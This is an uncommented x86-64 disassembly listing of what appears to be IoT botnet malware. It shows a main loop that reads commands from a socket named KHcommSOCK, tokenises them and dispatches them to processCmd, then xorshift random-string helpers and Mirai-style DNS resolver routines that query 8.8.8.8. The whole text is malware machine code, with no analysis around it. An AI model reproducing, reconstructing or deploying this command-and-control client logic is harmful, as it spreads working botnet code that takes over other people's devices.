  4065f9: b8 00 00 00 00               	mov	eax, 0x0
  4065fe: fc                           	cld
  4065ff: 48 8b bd 08 ef ff ff         	mov	rdi, qword ptr [rbp - 0x10f8]
  406606: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  406608: 48 89 c8                     	mov	rax, rcx
  40660b: 48 f7 d0                     	not	rax
  40660e: 48 ff c8                     	dec	rax
  406611: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  406615: 48 ff c8                     	dec	rax
  406618: c6 00 00                     	mov	byte ptr [rax], 0x0
  40661b: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  40661f: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406626: 48 89 85 00 ef ff ff         	mov	qword ptr [rbp - 0x1100], rax
  40662d: b8 00 00 00 00               	mov	eax, 0x0
  406632: fc                           	cld
  406633: 48 8b bd 00 ef ff ff         	mov	rdi, qword ptr [rbp - 0x1100]
  40663a: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  40663c: 48 89 c8                     	mov	rax, rcx
  40663f: 48 f7 d0                     	not	rax
  406642: 48 ff c8                     	dec	rax
  406645: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  406649: 48 ff c8                     	dec	rax
  40664c: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40664f: 3c 0a                        	cmp	al, 0xa
  406651: 74 94                        	je	0x4065e7 <main+0x422>
  406653: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  406657: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  40665e: 48 89 85 f8 ee ff ff         	mov	qword ptr [rbp - 0x1108], rax
  406665: b8 00 00 00 00               	mov	eax, 0x0
  40666a: fc                           	cld
  40666b: 48 8b bd f8 ee ff ff         	mov	rdi, qword ptr [rbp - 0x1108]
  406672: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  406674: 48 89 c8                     	mov	rax, rcx
  406677: 48 f7 d0                     	not	rax
  40667a: 48 ff c8                     	dec	rax
  40667d: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  406681: 48 ff c8                     	dec	rax
  406684: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406687: 3c 0d                        	cmp	al, 0xd
  406689: 0f 84 58 ff ff ff            	je	0x4065e7 <main+0x422>
  40668f: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  406693: 48 89 45 c8                  	mov	qword ptr [rbp - 0x38], rax
  406697: eb 04                        	jmp	0x40669d <main+0x4d8>
  406699: 48 ff 45 a8                  	inc	qword ptr [rbp - 0x58]
  40669d: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4066a1: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066a4: 3c 20                        	cmp	al, 0x20
  4066a6: 74 0b                        	je	0x4066b3 <main+0x4ee>
  4066a8: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4066ac: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066af: 84 c0                        	test	al, al
  4066b1: 75 e6                        	jne	0x406699 <main+0x4d4>
  4066b3: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4066b7: c6 00 00                     	mov	byte ptr [rax], 0x0
  4066ba: 48 ff 45 a8                  	inc	qword ptr [rbp - 0x58]
  4066be: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  4066c2: 48 89 45 d0                  	mov	qword ptr [rbp - 0x30], rax
  4066c6: eb 1b                        	jmp	0x4066e3 <main+0x51e>
  4066c8: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  4066cc: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066cf: 0f b6 f8                     	movzx	edi, al
  4066d2: e8 39 1b 00 00               	call	0x408210 <toupper>
  4066d7: 89 c2                        	mov	edx, eax
  4066d9: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  4066dd: 88 10                        	mov	byte ptr [rax], dl
  4066df: 48 ff 45 d0                  	inc	qword ptr [rbp - 0x30]
  4066e3: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  4066e7: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066ea: 84 c0                        	test	al, al
  4066ec: 75 da                        	jne	0x4066c8 <main+0x503>
  4066ee: c7 45 dc 01 00 00 00         	mov	dword ptr [rbp - 0x24], 0x1
  4066f5: 48 8b 7d a8                  	mov	rdi, qword ptr [rbp - 0x58]
  4066f9: be 43 2b 41 00               	mov	esi, 0x412b43
  4066fe: e8 15 34 00 00               	call	0x409b18 <strtok>
  406703: 48 89 45 e0                  	mov	qword ptr [rbp - 0x20], rax
  406707: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  40670b: 48 89 85 30 ff ff ff         	mov	qword ptr [rbp - 0xd0], rax
  406712: e9 cb 00 00 00               	jmp	0x4067e2 <main+0x61d>
  406717: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  40671b: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40671e: 3c 0a                        	cmp	al, 0xa
  406720: 0f 84 a9 00 00 00            	je	0x4067cf <main+0x60a>
  406726: 8b 5d dc                     	mov	ebx, dword ptr [rbp - 0x24]
  406729: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  40672d: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406734: 48 89 85 f0 ee ff ff         	mov	qword ptr [rbp - 0x1110], rax
  40673b: b8 00 00 00 00               	mov	eax, 0x0
  406740: fc                           	cld
  406741: 48 8b bd f0 ee ff ff         	mov	rdi, qword ptr [rbp - 0x1110]
  406748: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  40674a: 48 89 c8                     	mov	rax, rcx
  40674d: 48 f7 d0                     	not	rax
  406750: 48 ff c8                     	dec	rax
  406753: 48 8d 78 01                  	lea	rdi, [rax + 0x1]
  406757: e8 7c 3b 00 00               	call	0x40a2d8 <malloc>
  40675c: 48 89 c2                     	mov	rdx, rax
  40675f: 48 63 c3                     	movsxd	rax, ebx
  406762: 48 89 94 c5 30 ff ff ff      	mov	qword ptr [rbp + 8*rax - 0xd0], rdx
  40676a: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  40676e: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406775: 48 89 85 e8 ee ff ff         	mov	qword ptr [rbp - 0x1118], rax
  40677c: b8 00 00 00 00               	mov	eax, 0x0
  406781: fc                           	cld
  406782: 48 8b bd e8 ee ff ff         	mov	rdi, qword ptr [rbp - 0x1118]
  406789: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  40678b: 48 89 c8                     	mov	rax, rcx
  40678e: 48 f7 d0                     	not	rax
  406791: 48 ff c8                     	dec	rax
  406794: 48 8d 50 01                  	lea	rdx, [rax + 0x1]
  406798: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  40679b: 48 98                        	cdqe
  40679d: 48 8b 84 c5 30 ff ff ff      	mov	rax, qword ptr [rbp + 8*rax - 0xd0]
  4067a5: 48 89 c7                     	mov	rdi, rax
  4067a8: fc                           	cld
  4067a9: 48 89 d1                     	mov	rcx, rdx
  4067ac: b8 00 00 00 00               	mov	eax, 0x0
  4067b1: f3 aa                        	rep		stosb	byte ptr es:[rdi], al
  4067b3: 48 8b 75 e0                  	mov	rsi, qword ptr [rbp - 0x20]
  4067b7: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  4067ba: 48 98                        	cdqe
  4067bc: 48 8b 84 c5 30 ff ff ff      	mov	rax, qword ptr [rbp + 8*rax - 0xd0]
  4067c4: 48 89 c7                     	mov	rdi, rax
  4067c7: e8 94 2e 00 00               	call	0x409660 <strcpy>
  4067cc: ff 45 dc                     	inc	dword ptr [rbp - 0x24]
  4067cf: be 43 2b 41 00               	mov	esi, 0x412b43
  4067d4: bf 00 00 00 00               	mov	edi, 0x0
  4067d9: e8 3a 33 00 00               	call	0x409b18 <strtok>
  4067de: 48 89 45 e0                  	mov	qword ptr [rbp - 0x20], rax
  4067e2: 48 83 7d e0 00               	cmp	qword ptr [rbp - 0x20], 0x0
  4067e7: 0f 85 2a ff ff ff            	jne	0x406717 <main+0x552>
  4067ed: 48 8d b5 30 ff ff ff         	lea	rsi, [rbp - 0xd0]
  4067f4: 8b 7d dc                     	mov	edi, dword ptr [rbp - 0x24]
  4067f7: e8 3c d6 ff ff               	call	0x403e38 <processCmd>
  4067fc: 83 7d dc 01                  	cmp	dword ptr [rbp - 0x24], 0x1
  406800: 7e 2d                        	jle	0x40682f <main+0x66a>
  406802: c7 45 ec 01 00 00 00         	mov	dword ptr [rbp - 0x14], 0x1
  406809: c7 45 ec 01 00 00 00         	mov	dword ptr [rbp - 0x14], 0x1
  406810: eb 15                        	jmp	0x406827 <main+0x662>
  406812: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  406815: 48 98                        	cdqe
  406817: 48 8b bc c5 30 ff ff ff      	mov	rdi, qword ptr [rbp + 8*rax - 0xd0]
  40681f: e8 a3 49 00 00               	call	0x40b1c7 <free>
  406824: ff 45 ec                     	inc	dword ptr [rbp - 0x14]
  406827: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  40682a: 3b 45 dc                     	cmp	eax, dword ptr [rbp - 0x24]
  40682d: 7c e3                        	jl	0x406812 <main+0x64d>
  40682f: 48 8d b5 30 ef ff ff         	lea	rsi, [rbp - 0x10d0]
  406836: 8b 3d 44 e7 10 00            	mov	edi, dword ptr [rip + 0x10e744] # 0x514f80 <KHcommSOCK>
  40683c: ba 00 10 00 00               	mov	edx, 0x1000
  406841: e8 d0 af ff ff               	call	0x401816 <recvLine>
  406846: 89 45 a0                     	mov	dword ptr [rbp - 0x60], eax
  406849: 83 7d a0 ff                  	cmp	dword ptr [rbp - 0x60], -0x1
  40684d: 0f 85 9b fb ff ff            	jne	0x4063ee <main+0x229>
  406853: e9 45 fb ff ff               	jmp	0x40639d <main+0x1d8>

0000000000406858 <rand_init>:
  406858: 55                           	push	rbp
  406859: 48 89 e5                     	mov	rbp, rsp
  40685c: 53                           	push	rbx
  40685d: 48 83 ec 08                  	sub	rsp, 0x8
  406861: bf 00 00 00 00               	mov	edi, 0x0
  406866: e8 49 19 00 00               	call	0x4081b4 <time>
  40686b: 89 05 37 27 11 00            	mov	dword ptr [rip + 0x112737], eax # 0x518fa8 <x>
  406871: e8 ba 16 00 00               	call	0x407f30 <getpid>
  406876: 89 c3                        	mov	ebx, eax
  406878: e8 db 16 00 00               	call	0x407f58 <getppid>
  40687d: 31 d8                        	xor	eax, ebx
  40687f: 89 05 27 27 11 00            	mov	dword ptr [rip + 0x112727], eax # 0x518fac <y>
  406885: e8 ae 19 00 00               	call	0x408238 <clock>
  40688a: 89 05 20 27 11 00            	mov	dword ptr [rip + 0x112720], eax # 0x518fb0 <z>
  406890: 8b 15 1a 27 11 00            	mov	edx, dword ptr [rip + 0x11271a] # 0x518fb0 <z>
  406896: 8b 05 10 27 11 00            	mov	eax, dword ptr [rip + 0x112710] # 0x518fac <y>
  40689c: 31 d0                        	xor	eax, edx
  40689e: 89 05 10 27 11 00            	mov	dword ptr [rip + 0x112710], eax # 0x518fb4 <w>
  4068a4: 48 83 c4 08                  	add	rsp, 0x8
  4068a8: 5b                           	pop	rbx
  4068a9: c9                           	leave
  4068aa: c3                           	ret

00000000004068ab <rand_next>:
  4068ab: 55                           	push	rbp
  4068ac: 48 89 e5                     	mov	rbp, rsp
  4068af: 8b 05 f3 26 11 00            	mov	eax, dword ptr [rip + 0x1126f3] # 0x518fa8 <x>
  4068b5: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  4068b8: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  4068bb: c1 e0 0b                     	shl	eax, 0xb
  4068be: 31 45 fc                     	xor	dword ptr [rbp - 0x4], eax
  4068c1: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  4068c4: c1 e8 08                     	shr	eax, 0x8
  4068c7: 31 45 fc                     	xor	dword ptr [rbp - 0x4], eax
  4068ca: 8b 05 dc 26 11 00            	mov	eax, dword ptr [rip + 0x1126dc] # 0x518fac <y>
  4068d0: 89 05 d2 26 11 00            	mov	dword ptr [rip + 0x1126d2], eax # 0x518fa8 <x>
  4068d6: 8b 05 d4 26 11 00            	mov	eax, dword ptr [rip + 0x1126d4] # 0x518fb0 <z>
  4068dc: 89 05 ca 26 11 00            	mov	dword ptr [rip + 0x1126ca], eax # 0x518fac <y>
  4068e2: 8b 05 cc 26 11 00            	mov	eax, dword ptr [rip + 0x1126cc] # 0x518fb4 <w>
  4068e8: 89 05 c2 26 11 00            	mov	dword ptr [rip + 0x1126c2], eax # 0x518fb0 <z>
  4068ee: 8b 05 c0 26 11 00            	mov	eax, dword ptr [rip + 0x1126c0] # 0x518fb4 <w>
  4068f4: 89 c2                        	mov	edx, eax
  4068f6: c1 ea 13                     	shr	edx, 0x13
  4068f9: 8b 05 b5 26 11 00            	mov	eax, dword ptr [rip + 0x1126b5] # 0x518fb4 <w>
  4068ff: 31 d0                        	xor	eax, edx
  406901: 89 05 ad 26 11 00            	mov	dword ptr [rip + 0x1126ad], eax # 0x518fb4 <w>
  406907: 8b 05 a7 26 11 00            	mov	eax, dword ptr [rip + 0x1126a7] # 0x518fb4 <w>
  40690d: 33 45 fc                     	xor	eax, dword ptr [rbp - 0x4]
  406910: 89 05 9e 26 11 00            	mov	dword ptr [rip + 0x11269e], eax # 0x518fb4 <w>
  406916: 8b 05 98 26 11 00            	mov	eax, dword ptr [rip + 0x112698] # 0x518fb4 <w>
  40691c: c9                           	leave
  40691d: c3                           	ret

000000000040691e <rand__str>:
  40691e: 55                           	push	rbp
  40691f: 48 89 e5                     	mov	rbp, rsp
  406922: 53                           	push	rbx
  406923: 48 83 ec 18                  	sub	rsp, 0x18
  406927: 48 89 7d f0                  	mov	qword ptr [rbp - 0x10], rdi
  40692b: 89 75 ec                     	mov	dword ptr [rbp - 0x14], esi
  40692e: eb 76                        	jmp	0x4069a6 <rand__str+0x88>
  406930: 83 7d ec 03                  	cmp	dword ptr [rbp - 0x14], 0x3
  406934: 7e 20                        	jle	0x406956 <rand__str+0x38>
  406936: 48 8b 5d f0                  	mov	rbx, qword ptr [rbp - 0x10]
  40693a: b8 00 00 00 00               	mov	eax, 0x0
  40693f: e8 28 9d ff ff               	call	0x40066c <rand_cmwc>
  406944: 89 03                        	mov	dword ptr [rbx], eax
  406946: 48 83 45 f0 04               	add	qword ptr [rbp - 0x10], 0x4
  40694b: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  40694e: 83 e8 04                     	sub	eax, 0x4
  406951: 89 45 ec                     	mov	dword ptr [rbp - 0x14], eax
  406954: eb 50                        	jmp	0x4069a6 <rand__str+0x88>
  406956: 83 7d ec 01                  	cmp	dword ptr [rbp - 0x14], 0x1
  40695a: 7e 2a                        	jle	0x406986 <rand__str+0x68>
  40695c: 48 8b 5d f0                  	mov	rbx, qword ptr [rbp - 0x10]
  406960: b8 00 00 00 00               	mov	eax, 0x0
  406965: e8 02 9d ff ff               	call	0x40066c <rand_cmwc>
  40696a: 89 c2                        	mov	edx, eax
  40696c: b8 ff ff ff ff               	mov	eax, 0xffffffff
  406971: 21 d0                        	and	eax, edx
  406973: 66 89 03                     	mov	word ptr [rbx], ax
  406976: 48 83 45 f0 02               	add	qword ptr [rbp - 0x10], 0x2
  40697b: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  40697e: 83 e8 02                     	sub	eax, 0x2
  406981: 89 45 ec                     	mov	dword ptr [rbp - 0x14], eax
  406984: eb 20                        	jmp	0x4069a6 <rand__str+0x88>
  406986: b8 00 00 00 00               	mov	eax, 0x0
  40698b: e8 dc 9c ff ff               	call	0x40066c <rand_cmwc>
  406990: 89 c2                        	mov	edx, eax
  406992: b8 ff ff ff ff               	mov	eax, 0xffffffff
  406997: 21 c2                        	and	edx, eax
  406999: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  40699d: 88 10                        	mov	byte ptr [rax], dl
  40699f: 48 ff 45 f0                  	inc	qword ptr [rbp - 0x10]
  4069a3: ff 4d ec                     	dec	dword ptr [rbp - 0x14]
  4069a6: 83 7d ec 00                  	cmp	dword ptr [rbp - 0x14], 0x0
  4069aa: 7f 84                        	jg	0x406930 <rand__str+0x12>
  4069ac: 48 83 c4 18                  	add	rsp, 0x18
  4069b0: 5b                           	pop	rbx
  4069b1: c9                           	leave
  4069b2: c3                           	ret

00000000004069b3 <rand_alpha_str>:
  4069b3: 55                           	push	rbp
  4069b4: 48 89 e5                     	mov	rbp, rsp
  4069b7: 53                           	push	rbx
  4069b8: 48 83 ec 48                  	sub	rsp, 0x48
  4069bc: 48 89 7d c8                  	mov	qword ptr [rbp - 0x38], rdi
  4069c0: 89 75 c4                     	mov	dword ptr [rbp - 0x3c], esi
  4069c3: 48 8b 05 7b c1 00 00         	mov	rax, qword ptr [rip + 0xc17b] # 0x412b45 <C.125.6137+0x885>
  4069ca: 48 89 45 d0                  	mov	qword ptr [rbp - 0x30], rax
  4069ce: 48 8b 05 78 c1 00 00         	mov	rax, qword ptr [rip + 0xc178] # 0x412b4d <C.125.6137+0x88d>
  4069d5: 48 89 45 d8                  	mov	qword ptr [rbp - 0x28], rax
  4069d9: 0f b6 05 75 c1 00 00         	movzx	eax, byte ptr [rip + 0xc175] # 0x412b55 <C.125.6137+0x895>
  4069e0: 88 45 e0                     	mov	byte ptr [rbp - 0x20], al
  4069e3: eb 32                        	jmp	0x406a17 <rand_alpha_str+0x64>
  4069e5: e8 c1 fe ff ff               	call	0x4068ab <rand_next>
  4069ea: 89 c3                        	mov	ebx, eax
  4069ec: 48 8d 7d d0                  	lea	rdi, [rbp - 0x30]
  4069f0: e8 3b 0b 00 00               	call	0x407530 <util_strlen>
  4069f5: 89 45 bc                     	mov	dword ptr [rbp - 0x44], eax
  4069f8: 89 d8                        	mov	eax, ebx
  4069fa: ba 00 00 00 00               	mov	edx, 0x0
  4069ff: f7 75 bc                     	div	dword ptr [rbp - 0x44]
  406a02: 89 d0                        	mov	eax, edx
  406a04: 89 c0                        	mov	eax, eax
  406a06: 0f b6 44 05 d0               	movzx	eax, byte ptr [rbp + rax - 0x30]
  406a0b: 89 c2                        	mov	edx, eax
  406a0d: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  406a11: 88 10                        	mov	byte ptr [rax], dl
  406a13: 48 ff 45 c8                  	inc	qword ptr [rbp - 0x38]
  406a17: ff 4d c4                     	dec	dword ptr [rbp - 0x3c]
  406a1a: 83 7d c4 ff                  	cmp	dword ptr [rbp - 0x3c], -0x1
  406a1e: 75 c5                        	jne	0x4069e5 <rand_alpha_str+0x32>
  406a20: 48 83 c4 48                  	add	rsp, 0x48
  406a24: 5b                           	pop	rbx
  406a25: c9                           	leave
  406a26: c3                           	ret
  406a27: 90                           	nop

0000000000406a28 <resolv_domain_to_hostname>:
  406a28: 55                           	push	rbp
  406a29: 48 89 e5                     	mov	rbp, rsp
  406a2c: 48 83 ec 30                  	sub	rsp, 0x30
  406a30: 48 89 7d d8                  	mov	qword ptr [rbp - 0x28], rdi
  406a34: 48 89 75 d0                  	mov	qword ptr [rbp - 0x30], rsi
  406a38: 48 8b 7d d0                  	mov	rdi, qword ptr [rbp - 0x30]
  406a3c: e8 ef 0a 00 00               	call	0x407530 <util_strlen>
  406a41: ff c0                        	inc	eax
  406a43: 89 45 e4                     	mov	dword ptr [rbp - 0x1c], eax
  406a46: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406a4a: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
  406a4e: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406a52: 48 ff c0                     	inc	rax
  406a55: 48 89 45 f0                  	mov	qword ptr [rbp - 0x10], rax
  406a59: c6 45 fe 00                  	mov	byte ptr [rbp - 0x2], 0x0
  406a5d: eb 47                        	jmp	0x406aa6 <resolv_domain_to_hostname+0x7e>
  406a5f: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  406a63: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406a66: 88 45 ff                     	mov	byte ptr [rbp - 0x1], al
  406a69: 48 ff 45 d0                  	inc	qword ptr [rbp - 0x30]
  406a6d: 80 7d ff 2e                  	cmp	byte ptr [rbp - 0x1], 0x2e
  406a71: 74 06                        	je	0x406a79 <resolv_domain_to_hostname+0x51>
  406a73: 80 7d ff 00                  	cmp	byte ptr [rbp - 0x1], 0x0
  406a77: 75 1c                        	jne	0x406a95 <resolv_domain_to_hostname+0x6d>
  406a79: 0f b6 45 fe                  	movzx	eax, byte ptr [rbp - 0x2]
  406a7d: 48 8b 55 e8                  	mov	rdx, qword ptr [rbp - 0x18]
  406a81: 88 02                        	mov	byte ptr [rdx], al
  406a83: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  406a87: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
  406a8b: 48 ff 45 f0                  	inc	qword ptr [rbp - 0x10]
  406a8f: c6 45 fe 00                  	mov	byte ptr [rbp - 0x2], 0x0
  406a93: eb 11                        	jmp	0x406aa6 <resolv_domain_to_hostname+0x7e>
  406a95: fe 45 fe                     	inc	byte ptr [rbp - 0x2]
  406a98: 48 8b 55 f0                  	mov	rdx, qword ptr [rbp - 0x10]
  406a9c: 0f b6 45 ff                  	movzx	eax, byte ptr [rbp - 0x1]
  406aa0: 88 02                        	mov	byte ptr [rdx], al
  406aa2: 48 ff 45 f0                  	inc	qword ptr [rbp - 0x10]
  406aa6: 83 7d e4 00                  	cmp	dword ptr [rbp - 0x1c], 0x0
  406aaa: 0f 9f c0                     	setg	al
  406aad: ff 4d e4                     	dec	dword ptr [rbp - 0x1c]
  406ab0: 84 c0                        	test	al, al
  406ab2: 75 ab                        	jne	0x406a5f <resolv_domain_to_hostname+0x37>
  406ab4: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  406ab8: c6 00 00                     	mov	byte ptr [rax], 0x0
  406abb: c9                           	leave
  406abc: c3                           	ret

0000000000406abd <resolv_skip_name>:
  406abd: 55                           	push	rbp
  406abe: 48 89 e5                     	mov	rbp, rsp
  406ac1: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  406ac5: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  406ac9: 48 89 55 d8                  	mov	qword ptr [rbp - 0x28], rdx
  406acd: c7 45 f8 00 00 00 00         	mov	dword ptr [rbp - 0x8], 0x0
  406ad4: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406ad8: c7 00 01 00 00 00            	mov	dword ptr [rax], 0x1
  406ade: eb 60                        	jmp	0x406b40 <resolv_skip_name+0x83>
  406ae0: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  406ae4: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406ae7: 3c bf                        	cmp	al, -0x41
  406ae9: 76 3c                        	jbe	0x406b27 <resolv_skip_name+0x6a>
  406aeb: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  406aef: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406af2: 0f b6 c0                     	movzx	eax, al
  406af5: 89 c2                        	mov	edx, eax
  406af7: c1 e2 08                     	shl	edx, 0x8
  406afa: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  406afe: 48 ff c0                     	inc	rax
  406b01: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406b04: 0f b6 c0                     	movzx	eax, al
  406b07: 8d 04 02                     	lea	eax, [rdx + rax]
  406b0a: 2d 00 c0 00 00               	sub	eax, 0xc000
  406b0f: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  406b12: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  406b15: 48 03 45 e0                  	add	rax, qword ptr [rbp - 0x20]
  406b19: 48 ff c8                     	dec	rax
  406b1c: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
  406b20: c7 45 f8 01 00 00 00         	mov	dword ptr [rbp - 0x8], 0x1
  406b27: 48 ff 45 e8                  	inc	qword ptr [rbp - 0x18]
  406b2b: 83 7d f8 00                  	cmp	dword ptr [rbp - 0x8], 0x0
  406b2f: 75 0f                        	jne	0x406b40 <resolv_skip_name+0x83>
  406b31: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406b35: 8b 00                        	mov	eax, dword ptr [rax]
  406b37: 8d 50 01                     	lea	edx, [rax + 0x1]
  406b3a: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406b3e: 89 10                        	mov	dword ptr [rax], edx
  406b40: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  406b44: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406b47: 84 c0                        	test	al, al
  406b49: 75 95                        	jne	0x406ae0 <resolv_skip_name+0x23>
  406b4b: 83 7d f8 01                  	cmp	dword ptr [rbp - 0x8], 0x1
  406b4f: 75 0f                        	jne	0x406b60 <resolv_skip_name+0xa3>
  406b51: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406b55: 8b 00                        	mov	eax, dword ptr [rax]
  406b57: 8d 50 01                     	lea	edx, [rax + 0x1]
  406b5a: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  406b5e: 89 10                        	mov	dword ptr [rax], edx
  406b60: c9                           	leave
  406b61: c3                           	ret

0000000000406b62 <resolv_lookup>:
  406b62: 55                           	push	rbp
  406b63: 48 89 e5                     	mov	rbp, rsp
  406b66: 53                           	push	rbx
  406b67: 48 81 ec 58 11 00 00         	sub	rsp, 0x1158
  406b6e: 48 89 bd b8 ee ff ff         	mov	qword ptr [rbp - 0x1148], rdi
  406b75: be 10 00 00 00               	mov	esi, 0x10
  406b7a: bf 01 00 00 00               	mov	edi, 0x1
  406b7f: e8 bc 3f 00 00               	call	0x40ab40 <calloc>
  406b84: 48 89 85 78 ff ff ff         	mov	qword ptr [rbp - 0x88], rax
  406b8b: 48 8d 85 70 f7 ff ff         	lea	rax, [rbp - 0x890]
  406b92: 48 89 45 80                  	mov	qword ptr [rbp - 0x80], rax
  406b96: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406b9a: 48 83 c0 0c                  	add	rax, 0xc
  406b9e: 48 89 45 88                  	mov	qword ptr [rbp - 0x78], rax
  406ba2: 48 8b b5 b8 ee ff ff         	mov	rsi, qword ptr [rbp - 0x1148]
  406ba9: 48 8b 7d 88                  	mov	rdi, qword ptr [rbp - 0x78]
  406bad: e8 76 fe ff ff               	call	0x406a28 <resolv_domain_to_hostname>
  406bb2: 48 8b 7d 88                  	mov	rdi, qword ptr [rbp - 0x78]
  406bb6: e8 75 09 00 00               	call	0x407530 <util_strlen>
  406bbb: 48 98                        	cdqe
  406bbd: 48 03 45 88                  	add	rax, qword ptr [rbp - 0x78]
  406bc1: 48 ff c0                     	inc	rax
  406bc4: 48 89 45 90                  	mov	qword ptr [rbp - 0x70], rax
  406bc8: 48 c7 85 60 ef ff ff 00 00 00 00     	mov	qword ptr [rbp - 0x10a0], 0x0
  406bd3: 48 c7 85 68 ef ff ff 00 00 00 00     	mov	qword ptr [rbp - 0x1098], 0x0
  406bde: 48 8b 7d 88                  	mov	rdi, qword ptr [rbp - 0x78]
  406be2: e8 49 09 00 00               	call	0x407530 <util_strlen>
  406be7: 83 c0 11                     	add	eax, 0x11
  406bea: 89 45 9c                     	mov	dword ptr [rbp - 0x64], eax
  406bed: c7 45 a0 00 00 00 00         	mov	dword ptr [rbp - 0x60], 0x0
  406bf4: c7 45 a4 ff ff ff ff         	mov	dword ptr [rbp - 0x5c], 0xffffffff
  406bfb: c7 45 a8 00 00 00 00         	mov	dword ptr [rbp - 0x58], 0x0
  406c02: e8 a4 fc ff ff               	call	0x4068ab <rand_next>
  406c07: 89 c6                        	mov	esi, eax
  406c09: 89 f1                        	mov	ecx, esi
  406c0b: 48 89 c8                     	mov	rax, rcx
  406c0e: 48 c1 e0 0f                  	shl	rax, 0xf
  406c12: 48 89 c2                     	mov	rdx, rax
  406c15: 48 c1 e2 10                  	shl	rdx, 0x10
  406c19: 48 01 d0                     	add	rax, rdx
  406c1c: 48 01 c8                     	add	rax, rcx
  406c1f: 48 c1 e8 20                  	shr	rax, 0x20
  406c23: 89 c2                        	mov	edx, eax
  406c25: c1 ea 0f                     	shr	edx, 0xf
  406c28: 89 95 ac ee ff ff            	mov	dword ptr [rbp - 0x1154], edx
  406c2e: 8b 85 ac ee ff ff            	mov	eax, dword ptr [rbp - 0x1154]
  406c34: c1 e0 10                     	shl	eax, 0x10
  406c37: 2b 85 ac ee ff ff            	sub	eax, dword ptr [rbp - 0x1154]
  406c3d: 89 f2                        	mov	edx, esi
  406c3f: 29 c2                        	sub	edx, eax
  406c41: 89 95 ac ee ff ff            	mov	dword ptr [rbp - 0x1154], edx
  406c47: 8b 85 ac ee ff ff            	mov	eax, dword ptr [rbp - 0x1154]
  406c4d: 66 89 45 ae                  	mov	word ptr [rbp - 0x52], ax
  406c51: 48 8d bd 60 ef ff ff         	lea	rdi, [rbp - 0x10a0]
  406c58: be 10 00 00 00               	mov	esi, 0x10
  406c5d: e8 a5 0a 00 00               	call	0x407707 <util_zero>
  406c62: 66 c7 85 60 ef ff ff 02 00   	mov	word ptr [rbp - 0x10a0], 0x2
  406c6b: bf 08 08 08 08               	mov	edi, 0x8080808
